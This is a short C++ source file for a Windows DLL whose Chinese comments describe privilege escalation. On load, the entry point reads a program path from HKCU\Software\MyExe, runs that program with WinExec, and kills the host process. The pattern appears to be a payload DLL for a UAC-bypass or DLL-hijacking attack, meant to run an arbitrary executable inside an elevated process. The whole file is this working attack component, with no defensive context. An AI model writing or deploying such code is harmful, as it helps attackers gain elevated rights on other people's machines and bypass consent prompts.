// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include <stdio.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		//读取需要提权的exe路径并执行
		HKEY hKeyExe = NULL;
		TCHAR szExePath[MAX_PATH] = {};
		TCHAR szKeyName[MAX_PATH] = { L"Software\\MyExe" };
		long lResult = RegOpenKeyEx(HKEY_CURRENT_USER,
			szKeyName, 0, KEY_READ | KEY_WOW64_32KEY, &hKeyExe);
		if (lResult != ERROR_SUCCESS)
			ExitProcess(0);
		DWORD dwSize = MAX_PATH*2;
		RegQueryValueEx(hKeyExe, NULL, 0, NULL, (BYTE*)szExePath, &dwSize);
		char cPath[MAX_PATH] = {};
		WideCharToMultiByte(CP_ACP, NULL, szExePath, wcslen(szExePath), cPath, MAX_PATH, NULL, NULL);
		WinExec(cPath,SW_SHOWNORMAL);
		RegCloseKey(hKeyExe);
		ExitProcess(0);
		break;
	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

